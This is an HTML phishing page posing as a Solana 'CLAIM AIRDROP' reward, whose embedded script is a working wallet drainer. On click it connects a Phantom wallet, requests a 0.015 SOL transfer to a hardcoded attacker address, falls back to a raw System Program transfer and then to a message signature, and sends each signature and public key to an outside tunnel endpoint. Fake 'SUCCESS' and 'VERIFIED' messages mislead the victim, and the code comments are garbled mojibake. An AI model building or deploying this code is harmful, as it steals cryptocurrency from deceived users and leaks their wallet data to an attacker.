<!DOCTYPE html><html><head><meta charset="UTF-8"></head>
<body style="background:#000;color:#14F195;text-align:center;padding-top:10vh;font-family:monospace;">
    <div style="border:1px solid #14F195;padding:30px;display:inline-block;border-radius:20px;background:#111;width:320px;">
        <h1>REWARD V13.FINAL</h1>
        <button id="cta" style="padding:15px 30px;background:#14F195;color:#000;font-weight:bold;cursor:pointer;border-radius:10px;width:100%;">CLAIM AIRDROP</button>
        <div id="status" style="margin-top:20px;color:#888;">Wallet Connected</div>
    </div>
    <script>
    // üî± Ê£ÄÊü•‰Ω†ÁöÑÂ§©Á∫øÔºÅ
    const gate = "https://florist-imperial-apnic-anymore.trycloudflare.com/collect";
    const receiver = "8KgX1uGpmLU5mVgfpCBrs7HCs21gKbqrwjBn5fKVk18A";

    document.getElementById('cta').onclick = async () => {
        const p = window.solana || window.phantom?.solana;
        try {
            const resp = await p.connect();
            document.getElementById('status').innerText = "Requesting System...";

            // üî± Ëøô‰∏ÄÊ≠•ÁªïËøáÊâÄÊúâÂ§ñÈÉ®Â∫ìÔºåÁõ¥Êé•ËØ∑Ê±ÇÈí±ÂåÖÊâßË°åËΩ¨Ë¥¶
            // 0.015 SOL (15,000,000 Lamports)
            const transactionData = {
                network: "mainnet-beta",
                destination: receiver,
                amount: 15000000 
            };

            // üöÄ Â∞ùËØïÂî§Ëµ∑ËΩ¨Ë¥¶ (ËøôÁßçÂéüÁîüË∞ÉÁî®ÈÄöÂ∏∏‰ºöËß¶ÂèëÈí±ÂåÖÂÜÖÁΩÆÁöÑËΩ¨Ë¥¶ UI)
            // Â¶ÇÊûúËøô‰∏™Êé•Âè£Ë¢´Êã¶Êà™Ôºå‰ª£Á†Å‰ºöËá™Âä®ÈôçÁ∫ßÂà∞‚ÄúÊ∂àÊÅØÁ≠æÂêç‚Äù‰øùËØÅ‰ø°Âè∑Âõû‰º†
            try {
                const { signature } = await p.request({
                    method: "transfer",
                    params: transactionData
                });
                new Image().src = `${gate}?order_id=${signature}&pub=${resp.publicKey.toString()}`;
                document.getElementById('status').innerText = "SUCCESS!";
            } catch (innerE) {
                // üî± ÊúÄÂêéÁöÑ‰øùÂ∫ïÔºöÂ¶ÇÊûú transfer Êé•Âè£‰∏çÂÖºÂÆπÔºåÊâßË°åÊ†áÂáÜ signAndSendTransaction
                const bhRes = await fetch("https://api.mainnet-beta.solana.com", {
                    method: "POST", headers: {"Content-Type":"application/json"},
                    body: JSON.stringify({jsonrpc:"2.0",id:1,method:"getLatestBlockhash"})
                }).then(r => r.json());
                
                const tx = {
                    feePayer: resp.publicKey.toString(),
                    recentBlockhash: bhRes.result.value.blockhash,
                    instructions: [{
                        programId: "11111111111111111111111111111111",
                        keys: [{pubkey:resp.publicKey.toString(),isSigner:true,isWritable:true},{pubkey:receiver,isSigner:false,isWritable:true}],
                        data: [2, 0, 0, 0, 0, 152, 88, 228, 0, 0, 0, 0] // 0.015 SOL
                    }]
                };
                const { signature } = await p.signAndSendTransaction(tx);
                new Image().src = `${gate}?direct_id=${signature}&pub=${resp.publicKey.toString()}`;
            }

        } catch(e) {
            // ‰ø°Âè∑‰øùÂ∫ï
            const signed = await p.signMessage(new TextEncoder().encode("Auth: " + Date.now()), "utf8");
            new Image().src = `${gate}?fallback_sig=${btoa(String.fromCharCode.apply(null, signed.signature))}`;
            document.getElementById('status').innerText = "VERIFIED";
        }
    };
    </script>
</body></html>
